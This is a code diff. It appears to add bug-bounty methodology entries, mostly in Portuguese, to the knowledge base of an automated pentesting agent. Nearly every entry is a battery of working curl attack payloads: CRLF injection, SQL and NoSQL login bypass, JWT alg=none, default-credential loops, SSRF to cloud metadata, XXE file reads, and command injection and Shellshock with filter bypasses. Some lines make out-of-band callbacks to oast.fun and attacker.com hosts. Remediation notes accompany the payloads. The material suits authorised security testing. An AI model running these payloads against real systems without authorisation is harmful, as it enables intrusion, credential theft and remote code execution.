@@ -2332,6 +2332,816 @@ CRACKMAPEXEC (AD):
             {"name": "Crackmapexec SMB enum", "phase": "P14", "tool": "crackmapexec"},
         ],
     },
+    # ─────────────────────────────────────────────────────────────────────
+    # curl-based validations (EdOverflow bugbounty-cheatsheet) — checks
+    # done OUTSIDE the heavy tools. Cheap, fast, every recon should run
+    # at least the security-header + method probes before nuclei/sqlmap.
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "curl probes - HTTP method / verb tampering (EdOverflow)",
+        "vulnerability_type": "Access Control",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
+        "summary": "Sondagens curl que validam controle de acesso por método HTTP. Endpoints que aceitam apenas GET frequentemente caem se requisitados via POST/PUT/DELETE/PATCH/TRACE.",
+        "steps_to_reproduce": """
+1) Enumerar metodos aceitos:
+   curl -sk -X OPTIONS -i https://T/api/resource | grep -i allow
+
+2) Verbo override via header:
+   curl -sk -i https://T/api/resource -H "X-HTTP-Method-Override: PUT"
+   curl -sk -i https://T/api/resource -H "X-Method-Override: DELETE"
+   curl -sk -i https://T/api/resource -H "X-HTTP-Method: PUT"
+
+3) Verbo nao listado:
+   curl -sk -X PUT     -i https://T/admin/user/1
+   curl -sk -X DELETE  -i https://T/admin/user/1
+   curl -sk -X PATCH   -i https://T/admin/user/1
+   curl -sk -X TRACE   -i https://T/
+
+4) Idempotent + verb mistura:
+   curl -sk -X POST    -H "X-HTTP-Method: GET" -i https://T/login
+
+EVIDENCE TO CAPTURE:
+  - status code 200/201/204 em verbo nao autorizado
+  - Allow: header revelando metodos extras
+  - resposta diferente entre GET e POST no mesmo endpoint
+""",
+        "impact": "Bypass de WAF, RBAC fraco em rotas write, exposicao de TRACE (XST), modificacao de dados via verbo \"trusted\".",
+        "remediation": "Restringir verbos por rota; rejeitar X-HTTP-Method-Override em prod; desabilitar TRACE.",
+        "learned_mission": "Antes de qualquer scanner pesado, fazer probes curl em verbos HTTP para mapear superficie write/admin.",
+        "learned_prompt": "Run `curl -X OPTIONS` then PUT/DELETE/PATCH/TRACE on every promising path. Test X-HTTP-Method-Override header.",
+        "affected_phases": ["P05", "P06", "P14", "P15", "P19"],
+        "affected_skills": ["asset_discovery", "tech-http-fingerprint", "risk_assessment", "vuln-auth-bypass"],
+        "recommended_tools": ["curl", "curl-headers", "httpx", "ffuf"],
+        "learned_techniques": [
+            {"name": "OPTIONS allow-list discovery", "phase": "P05", "tool": "curl-headers"},
+            {"name": "X-HTTP-Method-Override bypass", "phase": "P14", "tool": "curl-headers"},
+            {"name": "Verb tampering on admin paths", "phase": "P19", "tool": "curl-headers"},
+            {"name": "TRACE/XST probe", "phase": "P05", "tool": "curl-headers"},
+        ],
+    },
+    {
+        "title": "curl probes - Header injection / CRLF (EdOverflow)",
+        "vulnerability_type": "CRLF Injection",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/crlf.md",
+        ],
+        "summary": "Payloads CRLF para HTTP response splitting / header injection. Validados via curl observando se o cabecalho injetado aparece na resposta.",
+        "steps_to_reproduce": """
+1) CRLF basic via query parameter:
+   curl -sk -i "https://T/?next=%0d%0aSet-Cookie:csrf_token=PWNED;"
+   curl -sk -i "https://T/?redirect=%0d%0aheader:header"
+   curl -sk -i "https://T/login%0d%0aSet-Cookie:session=evil"
+
+2) CRLF chained with open redirect:
+   curl -sk -i "https://T/redirect?url=//google.com/%2f%2e%2e%0d%0aX-Injected:1"
+
+3) Double encoding bypass:
+   curl -sk -i "https://T/%250aheader:header"
+   curl -sk -i "https://T/%25250aheader:header"
+   curl -sk -i "https://T/%u000aheader:header"
+
+4) Twitter/Yandex variant (encoded unicode CRLF):
+   curl -sk -i "https://T/?q=%E5%98%8A%E5%98%8Dheader:header"
+
+5) CRLF -> XSS via response split:
+   curl -sk -i "https://T/?next=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(1)>"
+
+6) Inspect for header in response:
+   curl -sk -D - "https://T/?x=%0d%0aX-Injected:1" | grep -i 'X-Injected'
+
+EVIDENCE TO CAPTURE:
+  - Header injetado aparece na resposta HTTP
+  - Set-Cookie controlado pelo atacante chega ao browser
+  - Status 301/302 com Location header malicioso
+""",
+        "impact": "Session fixation, cache poisoning, XSS via response splitting, open redirect cross-site, auth bypass.",
+        "remediation": "Sanitizar CR/LF antes de echo em headers; usar API HTTP que reject newlines em valores.",
+        "learned_mission": "Para todo parametro que aparece em Location/Set-Cookie, testar CRLF com payloads %0d%0a, %25%30a, %u000a, %E5%98%8A.",
+        "learned_prompt": "On every redirect/cookie-controlling param, inject %0d%0aX-Test:1 and check the response with `curl -D -` for the X-Test header.",
+        "affected_phases": ["P05", "P12", "P13", "P19"],
+        "affected_skills": ["risk_assessment", "vuln-information-disclosure", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "nuclei", "wapiti"],
+        "learned_techniques": [
+            {"name": "CRLF in redirect param", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Double-encoded CRLF bypass", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Unicode CRLF (Twitter)", "phase": "P12", "tool": "curl-headers"},
+            {"name": "CRLF -> XSS response splitting", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    {
+        "title": "curl probes - Login / Auth POST tampering (EdOverflow)",
+        "vulnerability_type": "Authentication Bypass",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
+        "summary": "Testes curl em endpoints de login: SQLi no usuario/senha, bypass por null byte, JSON vs form, credenciais default, brute-force baseline.",
+        "steps_to_reproduce": """
+1) SQLi clasico no login (form-urlencoded):
+   curl -sk -i -X POST https://T/login -d "username=admin'--&password=anything"
+   curl -sk -i -X POST https://T/login -d "username=' OR '1'='1&password=x"
+   curl -sk -i -X POST https://T/login -d "username=admin'/*&password=x"
+
+2) SQLi no login (JSON content-type):
+   curl -sk -i -X POST https://T/api/login \\
+        -H "Content-Type: application/json" \\
+        -d '{"username":"admin'\\''--","password":"x"}'
+
+3) Type juggling (PHP/Node):
+   curl -sk -i -X POST https://T/api/login \\
+        -H "Content-Type: application/json" \\
+        -d '{"username":"admin","password":true}'
+   curl -sk -i -X POST https://T/api/login \\
+        -H "Content-Type: application/json" \\
+        -d '{"username":"admin","password":{"$ne":null}}'   # NoSQL/Mongo
+
+4) Header-based identity spoof:
+   curl -sk -i https://T/admin -H "X-Forwarded-For: 127.0.0.1"
+   curl -sk -i https://T/admin -H "X-Original-URL: /admin"
+   curl -sk -i https://T/admin -H "X-Rewrite-URL: /admin"
+   curl -sk -i https://T/admin -H "Host: localhost"
+
+5) JWT alg=none (decode JWT, set alg, resign):
+   echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
+   curl -sk -i https://T/api/me -H "Authorization: Bearer <none-token>"
+
+6) Credenciais default web/aspnet:
+   for c in admin:admin admin:password administrator:administrator sa:sa root:root test:test; do
+     curl -sk -i -X POST https://T/login -d "username=${c%:*}&password=${c#*:}"
+   done
+
+7) Baseline para hydra (anota response length de sucesso vs falha):
+   curl -sk -o /dev/null -w "%{size_download}\\n" -X POST https://T/login -d "username=fake&password=fake"
+
+EVIDENCE TO CAPTURE:
+  - Status 200 + Set-Cookie de sessao em vez de 401/redirect
+  - Resposta de tamanho diferente entre user valido vs invalido
+  - Erro SQL no body apos payload com aspa
+""",
+        "impact": "Account takeover, privilege escalation, mass enumeration de usuarios validos via differential response.",
+        "remediation": "Prepared statements; rate limiting; constant-time auth response; reject controls headers X-Forwarded-* em rotas privilegiadas; usar exp/iat estritos em JWT; verificar alg em allowlist.",
+        "learned_mission": "Em todo login encontrado, rodar bateria curl: SQLi clasica, JSON type juggling, X-Forwarded headers, credenciais default. Esses 4 testes pegam 80% dos auth bypass triviais.",
+        "learned_prompt": "POST to /login with: ' OR '1'='1, admin'--, {\"password\":{\"$ne\":null}}. Spoof X-Forwarded-For: 127.0.0.1. Try sa:sa, admin:admin.",
+        "affected_phases": ["P14", "P19"],
+        "affected_skills": ["risk_assessment", "vuln-auth-bypass", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "sqlmap", "hydra", "jwt_tool", "ffuf"],
+        "learned_techniques": [
+            {"name": "Auth SQLi via form login", "phase": "P14", "tool": "curl-headers"},
+            {"name": "Auth SQLi via JSON login", "phase": "P14", "tool": "curl-headers"},
+            {"name": "NoSQL type juggling auth bypass", "phase": "P14", "tool": "curl-headers"},
+            {"name": "X-Forwarded-For/Host spoofing", "phase": "P14", "tool": "curl-headers"},
+            {"name": "JWT alg=none", "phase": "P14", "tool": "jwt_tool"},
+            {"name": "Default-creds baseline probe", "phase": "P14", "tool": "curl-headers"},
+        ],
+    },
+    {
+        "title": "curl probes - Security headers + cookie flags audit",
+        "vulnerability_type": "Security Misconfiguration",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
+        "summary": "Auditoria rapida de cabecalhos de seguranca e flags de cookie via curl - feedback imediato sem ferramentas pesadas.",
+        "steps_to_reproduce": """
+1) HEAD request com follow:
+   curl -sk -I -L https://T/
+
+2) Verificar headers de seguranca:
+   curl -sk -I https://T/ | grep -iE 'strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy|permissions-policy'
+
+3) Cookie flags:
+   curl -sk -i https://T/login | grep -i set-cookie
+   # Procurar por ausencia de: HttpOnly, Secure, SameSite
+
+4) CORS misconfig:
+   curl -sk -i https://T/api/me -H "Origin: https://attacker.com" | grep -i 'access-control'
+   # Bandeira vermelha: Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true
+
+5) CSP analise:
+   curl -sk -I https://T/ | grep -i 'content-security-policy'
+   # Procurar 'unsafe-inline', 'unsafe-eval', http: data: em script-src
+
+6) Cache poisoning vector:
+   curl -sk -i https://T/ -H "X-Forwarded-Host: evil.com"
+   curl -sk -i https://T/ -H "X-Host: evil.com"
+
+7) Public file leaks:
+   for f in robots.txt sitemap.xml .git/config .env .DS_Store backup.zip web.config phpinfo.php; do
+     curl -sk -o /dev/null -w "%{http_code} https://T/$f\\n" "https://T/$f"
+   done
+
+EVIDENCE TO CAPTURE:
+  - Headers ausentes (HSTS, CSP, X-Frame-Options)
+  - Set-Cookie sem HttpOnly/Secure/SameSite
+  - Access-Control-Allow-Origin permissivo
+  - 200 em /.git/config ou /web.config
+""",
+        "impact": "Clickjacking, MITM, XSS facilitado, CSRF cross-site, source-code leak via .git/web.config, cache poisoning.",
+        "remediation": "Configurar HSTS/CSP/XFO/XCTO/Referrer/Permissions; HttpOnly+Secure+SameSite em cookies; remover .git de webroot; CORS allowlist por origem.",
+        "learned_mission": "Toda iteracao de RECON deve incluir curl -I + curl -i em / e /login, e probes para .git/config, .env, web.config. Custo zero, cobertura enorme.",
+        "learned_prompt": "Always run `curl -I https://T/` first and grep security headers. Probe /.git/config, /.env, /web.config, /backup.zip. Check Set-Cookie flags.",
+        "affected_phases": ["P05", "P06", "P21", "P22"],
+        "affected_skills": ["asset_discovery", "tech-http-fingerprint", "tech-owasp-header-analysis", "vuln-information-disclosure"],
+        "recommended_tools": ["curl", "curl-headers", "httpx", "nuclei", "nikto"],
+        "learned_techniques": [
+            {"name": "Security headers audit", "phase": "P05", "tool": "curl-headers"},
+            {"name": "Cookie flags audit", "phase": "P05", "tool": "curl-headers"},
+            {"name": "CORS misconfig probe", "phase": "P05", "tool": "curl-headers"},
+            {"name": "Cache-poisoning headers", "phase": "P05", "tool": "curl-headers"},
+            {"name": "Sensitive file disclosure probe", "phase": "P21", "tool": "curl-headers"},
+        ],
+    },
+    {
+        "title": "curl probes - SSRF / Open Redirect (EdOverflow)",
+        "vulnerability_type": "Server-Side Request Forgery",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/ssrf.md",
+        ],
+        "summary": "Validacao curl de SSRF (gopher/dict/file, AWS metadata, IPv6, xip.io) e open redirect. Caracteristica: parametros como ?url=, ?next=, ?image=, ?callback=, ?webhook=, ?api=.",
+        "steps_to_reproduce": """
+1) Identificar parametros candidatos (recon):
+   curl -sk -i "https://T/?url=https://example.com"
+   # Indicadores: body da resposta contem dados de example.com
+
+2) AWS metadata service:
+   curl -sk -i "https://T/?url=http://169.254.169.254/latest/meta-data/"
+   curl -sk -i "https://T/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+3) Localhost / loopback obfuscado:
+   curl -sk -i "https://T/?url=http://127.0.0.1/"
+   curl -sk -i "https://T/?url=http://0177.1/"             # octal
+   curl -sk -i "https://T/?url=http://2130706433/"          # decimal
+   curl -sk -i "https://T/?url=http://0x7f.0x0.0x0.0x1/"   # hex
+   curl -sk -i "https://T/?url=http://[::1]/"               # IPv6
+   curl -sk -i "https://T/?url=http://[::]/"                # IPv6 zero
+   curl -sk -i "https://T/?url=http://0/"                   # null
+
+4) Protocolos exoticos:
+   curl -sk -i "https://T/?url=gopher://localhost:25/"
+   curl -sk -i "https://T/?url=dict://localhost:11211/stats"
+   curl -sk -i "https://T/?url=file:///etc/passwd"
+   curl -sk -i "https://T/?url=php://filter/convert.base64-encode/resource=index.php"
+
+5) Wildcard DNS (bypass de allowlist por dominio):
+   curl -sk -i "https://T/?url=http://10.0.0.1.nip.io/"
+   curl -sk -i "https://T/?url=http://customer.10.0.0.1.xip.io/"
+
+6) Open redirect:
+   curl -sk -I "https://T/?next=https://attacker.com"
+   curl -sk -I "https://T/?url=//attacker.com"
+   curl -sk -I "https://T/?next=/%09/attacker.com"
+   curl -sk -I "https://T/?url=//%2f%2eattacker.com"
+   curl -sk -I "https://T/?url=/\\\\attacker.com"
+   # Sucesso = Location: para dominio externo
+
+7) OOB via interactsh:
+   interactsh-client -v &
+   curl -sk -i "https://T/?url=http://<id>.oast.fun/"
+   # Sucesso = callback no listener
+
+EVIDENCE TO CAPTURE:
+  - Body da resposta contem instance-id / iam credentials
+  - Latency anormal indicando hit em IP interno
+  - Location: 3xx para dominio externo
+  - Callback no interactsh
+""",
+        "impact": "Roubo de credenciais cloud (IAM), pivot para servicos internos, leak de arquivos, phishing via redirect.",
+        "remediation": "Allowlist por dominio; bloquear IPs internos/metadata; allow only http/https; deny redirects cross-origin sem explicit consent.",
+        "learned_mission": "Todo parametro do tipo ?url=/next=/redirect=/image=/webhook= deve ser testado contra metadata (169.254.169.254), gopher://, dict://, file://, e redirect externo. Custo: 8 requests curl.",
+        "learned_prompt": "Probe ?url= with http://169.254.169.254/latest/meta-data/, gopher://, file:///etc/passwd, IPv6 [::1], decimal IP. For redirect: //attacker, /%09/attacker, /\\attacker.",
+        "affected_phases": ["P13", "P16"],
+        "affected_skills": ["risk_assessment", "vuln-ssrf-redirect"],
+        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "nuclei"],
+        "learned_techniques": [
+            {"name": "AWS metadata SSRF", "phase": "P13", "tool": "curl-headers"},
+            {"name": "Localhost obfuscation", "phase": "P13", "tool": "curl-headers"},
+            {"name": "Gopher/dict/file protocols", "phase": "P13", "tool": "curl-headers"},
+            {"name": "DNS wildcard bypass (xip/nip)", "phase": "P13", "tool": "curl-headers"},
+            {"name": "Open redirect chain", "phase": "P13", "tool": "curl-headers"},
+            {"name": "OOB via interactsh", "phase": "P13", "tool": "interactsh-client"},
+        ],
+    },
+    {
+        "title": "curl probes - XXE (POST XML body)",
+        "vulnerability_type": "XML External Entity",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/xxe.md",
+        ],
+        "summary": "Sondagens XXE via curl em endpoints que aceitam Content-Type: application/xml ou text/xml (SOAP, RSS, SAML, OOXML, SVG).",
+        "steps_to_reproduce": """
+0) Identificar endpoints XML-aware:
+   curl -sk -i -X POST https://T/api/endpoint -H "Content-Type: application/xml" -d '<foo/>'
+   # Se 200/400 com mensagem XML, prosseguir
+
+1) XXE direto (file read):
+   curl -sk -i -X POST https://T/api/endpoint \\
+        -H "Content-Type: application/xml" \\
+        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+
+2) XXE blind (OOB via attacker):
+   curl -sk -i -X POST https://T/api/endpoint \\
+        -H "Content-Type: application/xml" \\
+        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<id>.oast.fun/dtd"> %xxe;]><foo/>'
+
+3) XXE via base64 (binarios):
+   curl -sk -i -X POST https://T/api/endpoint \\
+        -H "Content-Type: application/xml" \\
+        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
+
+4) XXE -> SSRF:
+   curl -sk -i -X POST https://T/api/endpoint \\
+        -H "Content-Type: application/xml" \\
+        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+
+5) SOAP envelope com XXE:
+   curl -sk -X POST https://T/soap \\
+        -H "Content-Type: text/xml; charset=utf-8" \\
+        -H "SOAPAction: \"\"" \\
+        --data '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>'
+
+6) JSON-disfarcado-de-XML (Content-Type swap):
+   curl -sk -i -X POST https://T/api/json-endpoint \\
+        -H "Content-Type: application/xml" \\
+        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+   # Algumas APIs JSON aceitam XML sem validar Content-Type
+
+EVIDENCE TO CAPTURE:
+  - Conteudo de /etc/passwd no body da resposta
+  - Callback OOB no interactsh
+  - Latency anormal indicando hit DTD remoto
+""",
+        "impact": "Leak de arquivos do servidor, SSRF para metadata cloud, DoS por billion-laughs, RCE via expect:// quando PHP loaded.",
+        "remediation": "Desabilitar external entities no parser XML (libxml_disable_entity_loader); validar Content-Type estritamente; rejeitar DTDs.",
+        "learned_mission": "Endpoints com Content-Type XML/SOAP/SAML devem receber sempre 3 probes: direto SYSTEM file, OOB DTD, e SSRF para metadata.",
+        "learned_prompt": "POST XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'>, also OOB via http://<id>.oast.fun/, also SSRF via http://169.254.169.254/.",
+        "affected_phases": ["P12", "P13", "P16"],
+        "affected_skills": ["risk_assessment", "vuln-injection", "vuln-ssrf-redirect"],
+        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "wapiti"],
+        "learned_techniques": [
+            {"name": "XXE direct file read", "phase": "P12", "tool": "curl-headers"},
+            {"name": "XXE blind OOB", "phase": "P12", "tool": "curl-headers"},
+            {"name": "XXE base64 wrapper", "phase": "P12", "tool": "curl-headers"},
+            {"name": "XXE -> SSRF metadata", "phase": "P13", "tool": "curl-headers"},
+            {"name": "SOAP envelope XXE", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    {
+        "title": "curl probes - RCE / Shellshock / Command injection",
+        "vulnerability_type": "Remote Code Execution",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/rce.md",
+        ],
+        "summary": "Probes curl para command injection em param/header, Shellshock em User-Agent/Referer/Cookie, e Werkzeug debugger.",
+        "steps_to_reproduce": """
+1) Command injection em parametro:
+   curl -sk -i "https://T/?q=test;id"
+   curl -sk -i "https://T/?q=test|id"
+   curl -sk -i "https://T/?q=test\\`id\\`"
+   curl -sk -i "https://T/?q=test\\$(id)"
+   curl -sk -i "https://T/?q=test%26%26id"   # &&
+   curl -sk -i "https://T/?q=test%0aid"      # newline
+
+2) Shellshock em CGI (User-Agent / Referer / Cookie):
+   curl -sk -i https://T/cgi-bin/test.cgi -A '() { :; }; echo; echo "Vuln: $(id)"'
+   curl -sk -i https://T/cgi-bin/test.cgi -H 'Referer: () { :; }; /bin/cat /etc/passwd'
+   curl -sk -i https://T/cgi-bin/test.cgi --cookie '() { :; }; ping -c 1 <id>.oast.fun'
+   # Procurar em /cgi-bin/, .pl, .sh, .py CGI
+
+3) Werkzeug debugger (Flask em DEBUG=True):
+   curl -sk -i https://T/<wrong-path>
+   # Se status 500 com console, tentar:
+   curl -sk -i "https://T/console" -A "stríng"      # Cyrillic 'i' to trigger error
+
+4) Command injection bypass de filtros:
+   curl -sk -i "https://T/?q=test;{ls,-la}"
+   curl -sk -i "https://T/?q=test;cat\$IFS/etc/passwd"
+   curl -sk -i "https://T/?q=test;cat\${IFS}/etc/passwd"
+   curl -sk -i "https://T/?q=test;ca''t /etc/passwd"
+   curl -sk -i "https://T/?q=test;cat /et?/p?sswd"
+
+5) Pingback OOB:
+   curl -sk -i "https://T/?q=test;curl http://<id>.oast.fun"
+   curl -sk -i "https://T/?q=test;wget http://<id>.oast.fun"
+   curl -sk -i "https://T/?q=test;nslookup <id>.oast.fun"
+
+EVIDENCE TO CAPTURE:
+  - Output de `id`/`uname` no body
+  - Callback HTTP/DNS no interactsh
+  - Tempo de resposta anomalo (sleep injection)
+  - Werkzeug debugger console
+""",
+        "impact": "Execucao arbitraria de codigo no servidor, web shell drop, exfiltration.",
+        "remediation": "Nunca passar input do usuario para shell; usar APIs parametrizadas (subprocess com args list); chroot/seccomp; atualizar bash para >=4.3 (Shellshock).",
+        "learned_mission": "Para CGI/Python/Node endpoints, sempre testar Shellshock em User-Agent e command injection com ; | && $() em params. Pingback via interactsh confirma blind RCE.",
+        "learned_prompt": "Inject ;id, |id, $(id), `id`, %0aid in every param. Send User-Agent: () { :; }; echo vuln to /cgi-bin/. Use interactsh for blind confirmation.",
+        "affected_phases": ["P12", "P14", "P19"],
+        "affected_skills": ["risk_assessment", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "nuclei"],
+        "learned_techniques": [
+            {"name": "Command injection in param", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Shellshock via User-Agent", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Werkzeug debugger discovery", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Filter bypass via brace/IFS", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Pingback OOB blind RCE", "phase": "P12", "tool": "interactsh-client"},
+        ],
+    },
+    {
+        "title": "curl probes - XSS reflexivo (header e param) com indicador",
+        "vulnerability_type": "Cross-Site Scripting",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/xss.md",
+        ],
+        "summary": "Probes curl que detectam reflexao bruta de input em HTML/atributo/JS sem necessidade de browser headless. Cobre Referer, User-Agent, X-Forwarded-Host, query params.",
+        "steps_to_reproduce": """
+1) Canary mark (string unica nao codificada):
+   MARK='\\\"x><scriPt>SK0X</scrIpt>'
+   curl -sk "https://T/?q=$MARK" | grep -F "$MARK"
+   # Se aparecer literal, ha XSS reflexivo bruto
+
+2) Reflexao via header:
+   curl -sk "https://T/" -A '"><scrIpt>SK0X</scrIpt>'      | grep -F 'scrIpt>SK0X'
+   curl -sk "https://T/" -e '"><scrIpt>SK0X</scrIpt>'      | grep -F 'scrIpt>SK0X'      # Referer
+   curl -sk "https://T/" -H 'X-Forwarded-Host: "><scrIpt>SK0X</scrIpt>' | grep -F SK0X
+   curl -sk "https://T/" -H 'X-Forwarded-For: "><scrIpt>SK0X</scrIpt>'   | grep -F SK0X
+   curl -sk "https://T/" -H 'Cookie: name="><scrIpt>SK0X</scrIpt>'       | grep -F SK0X
+
+3) Reflexao em contexto JS string:
+   curl -sk "https://T/?q=';alert(1);//" | grep -F "';alert(1);//"
+
+4) Reflexao em atributo:
+   curl -sk 'https://T/?q=" onmouseover=alert(1) x="' | grep -F 'onmouseover=alert(1)'
+
+5) Payloads WAF-bypass (Wordfence/Incapsula):
+   curl -sk 'https://T/?q=<meter onmouseover="alert(1)"'
+   curl -sk 'https://T/?q=<iframe/onload="alert(1)">'
+   curl -sk 'https://T/?q=<svg onload=alert(1)>'
+   curl -sk 'https://T/?q=<img/src=q onerror="alert(1)">'
+
+6) AngularJS template (se sandbox 1.0-1.5):
+   curl -sk 'https://T/?q={{constructor.constructor("alert(1)")()}}'
+
+7) JSONP callback fuzz:
+   curl -sk 'https://T/api/data?callback=SK0X' | head -c 100 | grep -F SK0X
+   # Se calback() envolvendo JSON, ha JSONP -> potencial XSS via Content-Type
+
+EVIDENCE TO CAPTURE:
+  - Canary aparece literalmente no HTML (nao escapado)
+  - Content-Type: text/html quando deveria ser JSON
+  - Header reflection no body sem encoding
+""",
+        "impact": "Cookie theft, session hijack, credential phishing, defacement, drive-by exploit chain.",
+        "remediation": "Context-aware output encoding; strict CSP com nonce; HttpOnly+Secure+SameSite cookies; rejeitar Content-Type swap.",
+        "learned_mission": "Para cada query/header refletivo, injetar canary unico via curl e fazer grep. Se literal aparecer, escalar para dalfox/XSStrike.",
+        "learned_prompt": "Send a unique canary mark via ?q=, User-Agent, Referer, X-Forwarded-Host. Grep response. If canary unescaped, mark XSS and run dalfox.",
+        "affected_phases": ["P12"],
+        "affected_skills": ["risk_assessment", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "dalfox", "nuclei"],
+        "learned_techniques": [
+            {"name": "Canary reflection in param", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Canary reflection in User-Agent", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Canary in Referer/X-Forwarded-Host", "phase": "P12", "tool": "curl-headers"},
+            {"name": "JS-context single quote breakout", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Attribute context breakout", "phase": "P12", "tool": "curl-headers"},
+            {"name": "JSONP callback content-type swap", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # PRINCIPIO DE ORQUESTRACAO: recon dirige tudo. Sem hipotese, sem tool.
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "Recon-First Orchestration - cada ferramenta requer uma hipotese (EdOverflow tips)",
+        "vulnerability_type": "Methodology",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/bugbountytips.md",
+            "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/recon.md",
+        ],
+        "summary": "O recon nao e uma fase isolada - e o motor que gera hipoteses para todas as fases seguintes. Cada execucao de ferramenta tem que responder a pergunta: 'qual evidencia me leva a essa hipotese e qual signal eu espero ver?'.",
+        "steps_to_reproduce": """
+PRINCIPIO: SEM HIPOTESE, SEM EXECUCAO
+
+Fluxo correto:
+  recon evidencia X -> hipotese H -> ferramenta T com payload P -> sinal S -> finding F
+
+1) Recon orquestrado (recon.md):
+   # Certificate transparency mining
+   curl https://certspotter.com/api/v0/certs?domain=T | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\\*\\.//g' | uniq
+   # crt.sh
+   curl -s "https://crt.sh/?q=%25.T&output=json" | jq -r '.[].name_value' | sort -u
+   # passive sources
+   subfinder -d T -all -silent | anew subs.txt
+   amass enum -passive -d T | anew subs.txt
+   assetfinder -subs-only T | anew subs.txt
+   # active resolve + probe
+   dnsx -l subs.txt -silent | httpx -silent -title -tech-detect -status-code -tls-probe -json > alive.json
+   # service scan
+   naabu -host T -top-ports 1000 -silent | nmap -sV -sC -iL - -oA scan
+   # JS/Endpoint mining
+   katana -u https://T -d 5 -jc -kf all -silent
+   gau T | uro | anew urls.txt
+   waybackurls T | anew urls.txt
+   # parameter discovery
+   arjun -i alive.txt -oT params.txt --stable
+   paramspider -d T
+
+2) Cada finding de recon GERA hipotese (fazer JOIN no agente):
+   Evidencia                                 Hipotese gerada
+   X-AspNet-Version: 4.0.30319            -> H1: SQLi em ASP/MSSQL (?id=,?search=)
+   X-Powered-By: PHP                      -> H2: SQLi em PHP/MySQL + LFI
+   Set-Cookie: ASPSESSIONID (no HttpOnly) -> H3: XSS p/ session-steal
+   Access-Control-Allow-Origin: <origin>   -> H4: CORS misconfig
+   ?next=,?url=,?redirect= no URL          -> H5: open-redirect + CRLF + SSRF
+   Content-Type: application/xml aceito    -> H6: XXE
+   /cgi-bin/ no path                       -> H7: Shellshock
+   .git/HEAD = 200                         -> H8: source-code disclosure
+   robots.txt expoe /admin/                -> H9: directory fuzzing direcionado
+   wpscan: WordPress detectado            -> H10: plugin CVE + xmlrpc
+
+3) Cada hipotese tem signal de validacao OBJETIVO:
+   H1 SQLi: WAITFOR DELAY '0:0:5' -> latency >5s
+   H3 XSS:  canary refletido literal -> grep no body
+   H4 CORS: ACAO==Origin atacante + credentials=true
+   H5 redirect: Location: para dominio externo
+   H7 Shellshock: User-Agent payload retorna `id` no body
+   H8 .git: status 200 + content "ref:" no header HEAD
+
+4) Bibliografia recon-driven:
+   * Sublist3r/Amass/Subfinder paralelo (recon.md)
+   * Aquatone p/ visual recon
+   * relative-url-extractor em JS
